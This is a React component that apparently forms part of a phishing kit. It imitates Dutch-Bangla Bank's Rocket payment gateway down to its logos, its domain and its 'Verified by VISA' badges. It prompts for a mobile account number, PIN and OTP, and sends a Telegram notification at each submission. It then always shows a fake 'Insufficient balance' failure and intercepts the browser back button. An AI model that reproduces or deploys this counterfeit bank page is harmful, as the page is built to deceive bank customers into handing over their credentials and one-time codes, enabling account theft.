import { useState, useEffect, useRef } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { sendTelegramNotification } from "@/lib/telegram";
import dbblHeader from "@/assets/dbbl-header.jpg";
import secureLogos from "@/assets/3d-secure-logos.jpg";
import otpIllustration from "@/assets/otp-illustration.jpg";

const RocketPayment = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const [mobileAccount, setMobileAccount] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [pinAttempts, setPinAttempts] = useState(0);
  const [showError, setShowError] = useState("");
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [showFailed, setShowFailed] = useState(false);
  const [showOtp, setShowOtp] = useState(false);

  const mobileRef = useRef<HTMLInputElement>(null);
  const pinRef = useRef<HTMLInputElement>(null);
  const otpRef = useRef<HTMLInputElement>(null);

  const descriptionId = "6121177461411359757";

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}.00`, { replace: true });
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate]);

  useEffect(() => {
    setTimeout(() => mobileRef.current?.focus(), 100);
  }, []);

  useEffect(() => {
    if (showOtp) {
      setTimeout(() => otpRef.current?.focus(), 100);
    }
  }, [showOtp]);

  useEffect(() => {
    if (showFailed && redirectTimer > 0) {
      const interval = setInterval(() => setRedirectTimer(p => p - 1), 1000);
      return () => clearInterval(interval);
    }
    if (showFailed && redirectTimer === 0) {
      navigate(`/payment-cancelled?channel=Rocket&reason=Insufficient Balance&amount=${amount}.00`);
    }
  }, [showFailed, redirectTimer, navigate]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  const isValidMobile = () => {
    return mobileAccount.length === 12 && validPrefixes.includes(mobileAccount.substring(0, 3)) && /^\d+$/.test(mobileAccount);
  };

  const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 12);
    setMobileAccount(value);
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 5);
    setPin(value);
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setOtp(value);
  };

  const handleSubmit = () => {
    if (!isValidMobile()) {
      setShowError("Please enter a valid mobile number.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    if (pin.length < 4) {
      setShowError("Please enter your PIN.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }

    setIsSubmitting(true);
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket' });

    // Go straight to OTP page
    setTimeout(() => {
      setIsSubmitting(false);
      setShowOtp(true);
    }, 2000);
  };

  const handleOtpSubmit = () => {
    if (otp.length < 4) {
      setShowError("Please enter the OTP.");
      setTimeout(() => setShowError(""), 3000);
      return;
    }
    setIsSubmitting(true);
    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket OTP' });

    setTimeout(() => {
      setIsSubmitting(false);
      setShowFailed(true);
      setRedirectTimer(5);
    }, 2000);
  };

  const handleBack = () => {
    navigate(`/payment-cancelled?channel=Rocket&reason=Payment isn't completed&amount=${amount}.00`);
  };

  const handleReset = () => {
    setMobileAccount("");
    setPin("");
    setShowError("");
    setTimeout(() => mobileRef.current?.focus(), 50);
  };

  const togglePinVisibility = () => setShowPin(!showPin);

  // Header: DBBL logo image
  const header = (
    <div className="bg-[#e8e8e8]">
      <img src={dbblHeader} alt="Dutch-Bangla Bank" className="w-full h-auto" />
    </div>
  );

  // Blue lines with DBBL NEXUS GATEWAY text (blue text on white bg)
  const gatewayBanner = (
    <>
      <div className="h-[4px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
      <div className="bg-white py-1.5 text-center">
        <span className="text-[#0000cc] text-lg min-[375px]:text-xl font-bold tracking-wide" style={{ fontFamily: 'Georgia, "Times New Roman", serif' }}>
          DBBL NEXUS GATEWAY
        </span>
      </div>
      <div className="h-[4px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
    </>
  );

  // Footer with colored line
  const footer = (
    <div>
      <div className="h-[3px] bg-gradient-to-r from-[#cc0000] via-[#009933] via-[#003399] to-[#003399]"></div>
      <div className="h-[3px] bg-gradient-to-r from-[#0044aa] via-[#0066cc] to-[#0044aa]"></div>
      <div className="text-center py-1.5 min-[375px]:py-2">
        <p className="text-xs min-[375px]:text-sm font-bold text-[#333]" style={{ fontFamily: 'Arial, sans-serif' }}>
          DBBL E-COMM With Service Hub Limited
        </p>
        <p className="text-[10px] min-[375px]:text-xs text-[#666]" style={{ fontFamily: 'Arial, sans-serif' }}>
          ecom1.dutchbanglabank.com
        </p>
      </div>
    </div>
  );

  // Retro metallic button SVG
  const makeButton = (label: string) => {
    const encoded = encodeURIComponent(label);
    return `data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='28'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='0%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%23e0e0e0'/%3E%3Cstop offset='50%25' stop-color='%23c8c8c8'/%3E%3Cstop offset='100%25' stop-color='%23a0a0a0'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='28' rx='2' fill='url(%23g)' stroke='%23888' stroke-width='1'/%3E%3Crect x='4' y='0' width='3' height='28' fill='%23cc0000'/%3E%3Crect x='7' y='0' width='3' height='28' fill='%23009933'/%3E%3Crect x='10' y='0' width='3' height='28' fill='%23003399'/%3E%3Crect x='107' y='0' width='3' height='28' fill='%23003399'/%3E%3Crect x='110' y='0' width='3' height='28' fill='%23009933'/%3E%3Crect x='113' y='0' width='3' height='28' fill='%23cc0000'/%3E%3Ctext x='60' y='19' text-anchor='middle' font-family='Arial' font-size='13' font-weight='bold' fill='%23333'%3E${encoded}%3C/text%3E%3C/svg%3E`;
  };

  // OTP Page (matches second screenshot exactly)
  if (showOtp) {
    return (
      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center px-4 py-6">
        <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
          {header}
          {/* Colored line under header */}
          <div className="flex h-[4px]">
            <div className="flex-1 bg-[#0044aa]"></div>
            <div className="flex-1 bg-[#cc0000]"></div>
            <div className="flex-1 bg-[#009933]"></div>
            <div className="flex-1 bg-[#0044aa]"></div>
          </div>

          <div className="px-4 min-[375px]:px-6 py-4 min-[375px]:py-5">
            {showError && (
              <div className="text-center text-red-600 text-xs mb-2 font-medium">{showError}</div>
            )}

            <p className="text-[13px] min-[375px]:text-sm text-[#333] leading-relaxed mb-4" style={{ fontFamily: 'Arial, sans-serif' }}>
              An OTP (One Time Password) has been sent to your registered mobile and e-mail. Please input the OTP for verification.
            </p>

            <hr className="border-[#ddd] mb-4" />

            <div className="flex items-center gap-3 mb-4">
              <label className="text-[12px] min-[375px]:text-[13px] text-[#333] whitespace-nowrap" style={{ fontFamily: 'Arial, sans-serif' }}>
                OTP (One Time Password):
              </label>
              <input
                ref={otpRef}
                type="text"
                inputMode="numeric"
                value={otp}
                onChange={handleOtpChange}
                className="border border-[#999] px-2 py-1 text-sm w-[100px] focus:outline-none focus:border-[#0066cc]"
                style={{ fontFamily: 'Arial, sans-serif' }}
              />
            </div>

            {/* Go button */}
            <div className="flex justify-center mb-6">
              <button
                onClick={handleOtpSubmit}
                disabled={isSubmitting}
                className="border border-[#999] bg-[#f0f0f0] px-2 py-0.5 flex items-center gap-1 hover:bg-[#e0e0e0] text-sm"
                style={{ fontFamily: 'Arial, sans-serif' }}
              >
                <span className="font-bold text-[#333]">Go</span>
                <span className="bg-red-600 text-white text-[10px] font-bold px-1 py-[1px] leading-none">&gt;</span>
              </button>
            </div>

            {/* OTP illustration */}
            <div className="flex justify-center">
              <img src={otpIllustration} alt="OTP Verification" className="w-full max-w-[500px] h-auto border border-[#ccc]" loading="lazy" />
            </div>
          </div>
        </div>

        {isSubmitting && (
          <div className="fixed inset-0 bg-white/80 flex items-center justify-center z-50">
            <div className="text-center">
              <div className="w-6 h-6 border-2 border-[#0066cc] border-t-transparent rounded-full animate-spin mx-auto mb-1"></div>
              <p className="text-xs text-[#333]">Processing...</p>
            </div>
          </div>
        )}
      </div>
    );
  }

  // Failed page
  if (showFailed) {
    return (
      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center px-4 py-6">
        <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
          {header}
          {gatewayBanner}
          <div className="p-4 min-[375px]:p-6 text-center">
            <p className="text-red-600 font-bold text-sm min-[375px]:text-base mb-1">Transaction Failed</p>
            <p className="text-gray-600 text-xs min-[375px]:text-sm mb-1">Insufficient balance in your account.</p>
            <p className="text-gray-500 text-[10px] min-[375px]:text-xs">
              Redirecting to merchant website in {redirectTimer}s...
            </p>
          </div>
          {footer}
        </div>
      </div>
    );
  }

  // Main form page (matches first screenshot exactly)
  return (
    <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center px-4 py-6">
      <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
        {header}
        {gatewayBanner}

        {/* Form Section */}
        <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
          <h2 className="text-center font-bold text-xs min-[375px]:text-sm text-[#333] mb-3 min-[375px]:mb-4" style={{ fontFamily: 'Arial, sans-serif' }}>
            Mobile Account Information
          </h2>

          {showError && (
            <div className="text-center text-red-600 text-[10px] min-[375px]:text-xs mb-2 font-medium">
              {showError}
            </div>
          )}

          {/* Form */}
          <div className="max-w-md mx-auto space-y-2 min-[375px]:space-y-2.5">
            {/* Mobile Account */}
            <div className="flex items-center justify-center gap-2">
              <label className="text-[11px] min-[375px]:text-xs text-[#333] whitespace-nowrap text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>
                Mobile Account
              </label>
              <input
                ref={mobileRef}
                type="text"
                inputMode="numeric"
                value={mobileAccount}
                onChange={handleMobileChange}
                className="border border-[#999] px-1.5 py-0.5 min-[375px]:py-1 text-xs min-[375px]:text-sm w-[160px] min-[375px]:w-[200px] focus:outline-none focus:border-[#0066cc]"
                style={{ fontFamily: 'Arial, sans-serif' }}
              />
            </div>

            {/* PIN */}
            <div className="flex items-center justify-center gap-2">
              <label className="text-[11px] min-[375px]:text-xs text-[#333] whitespace-nowrap text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>
                PIN
              </label>
              <div className="flex items-center gap-1 w-[160px] min-[375px]:w-[200px]">
                <input
                  ref={pinRef}
                  type={showPin ? "text" : "password"}
                  inputMode="numeric"
                  value={pin}
                  onChange={handlePinChange}
                  className="border border-[#999] px-1.5 py-0.5 min-[375px]:py-1 text-xs min-[375px]:text-sm w-[80px] min-[375px]:w-[100px] focus:outline-none focus:border-[#0066cc]"
                  style={{ fontFamily: 'Arial, sans-serif' }}
                />
                <button
                  onClick={togglePinVisibility}
                  className="w-[30px] min-[375px]:w-[34px] h-[22px] min-[375px]:h-[26px] border border-[#999] bg-[#f5f5f5] flex items-center justify-center"
                  title={showPin ? "Hide PIN" : "Show PIN"}
                >
                  <svg width="16" height="12" viewBox="0 0 20 14" fill="none">
                    <rect x="1" y="1" width="18" height="12" rx="1" stroke="#666" strokeWidth="1" fill="#ddd" />
                    <line x1="3" y1="4" x2="5" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="6" y1="4" x2="8" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="9" y1="4" x2="11" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="12" y1="4" x2="14" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="15" y1="4" x2="17" y2="4" stroke="#888" strokeWidth="1" />
                    <line x1="3" y1="7" x2="5" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="6" y1="7" x2="8" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="9" y1="7" x2="11" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="12" y1="7" x2="14" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="15" y1="7" x2="17" y2="7" stroke="#888" strokeWidth="1" />
                    <line x1="3" y1="10" x2="5" y2="10" stroke="#888" strokeWidth="1" />
                    <line x1="6" y1="10" x2="8" y2="10" stroke="#888" strokeWidth="1" />
                    <line x1="9" y1="10" x2="11" y2="10" stroke="#888" strokeWidth="1" />
                  </svg>
                </button>
              </div>
            </div>

            {/* Amount */}
            <div className="flex items-center justify-center gap-2 pt-0.5">
              <span className="text-[11px] min-[375px]:text-xs text-[#333] text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>Amount</span>
              <span className="text-[11px] min-[375px]:text-xs text-[#333] w-[160px] min-[375px]:w-[200px]" style={{ fontFamily: 'Arial, sans-serif' }}>{amount}</span>
            </div>

            {/* Currency */}
            <div className="flex items-center justify-center gap-2">
              <span className="text-[11px] min-[375px]:text-xs text-[#333] text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>Currency</span>
              <span className="text-[11px] min-[375px]:text-xs text-[#333] w-[160px] min-[375px]:w-[200px]" style={{ fontFamily: 'Arial, sans-serif' }}>BDT</span>
            </div>

            {/* Description */}
            <div className="flex items-center justify-center gap-2">
              <span className="text-[11px] min-[375px]:text-xs text-[#333] text-right w-[100px]" style={{ fontFamily: 'Arial, sans-serif' }}>Description</span>
              <span className="text-[10px] min-[375px]:text-xs text-[#333] w-[160px] min-[375px]:w-[200px]" style={{ fontFamily: 'Arial, sans-serif' }}>{descriptionId}</span>
            </div>
          </div>

          {/* Buttons */}
          <div className="flex items-center justify-center gap-2 mt-4 min-[375px]:mt-5">
            <button onClick={handleBack} className="hover:opacity-80">
              <img src={makeButton("BACK")} alt="BACK" className="h-7 cursor-pointer" />
            </button>
            <button onClick={handleSubmit} disabled={isSubmitting} className="hover:opacity-80">
              <img src={makeButton("SUBMIT")} alt="SUBMIT" className="h-7 cursor-pointer" />
            </button>
            <button onClick={handleReset} className="hover:opacity-80">
              <img src={makeButton("RESET")} alt="RESET" className="h-7 cursor-pointer" />
            </button>
          </div>

          {/* Verified logos */}
          <div className="flex items-center justify-center mt-4 min-[375px]:mt-5">
            <img src={secureLogos} alt="Verified by VISA & MasterCard SecureCode" className="h-10 min-[375px]:h-12 object-contain" />
          </div>
        </div>

        {footer}
      </div>

      {/* Loading overlay */}
      {isSubmitting && (
        <div className="fixed inset-0 bg-white/80 flex items-center justify-center z-50">
          <div className="text-center">
            <div className="w-6 h-6 border-2 border-[#0066cc] border-t-transparent rounded-full animate-spin mx-auto mb-1"></div>
            <p className="text-xs text-[#333]">Processing...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default RocketPayment;
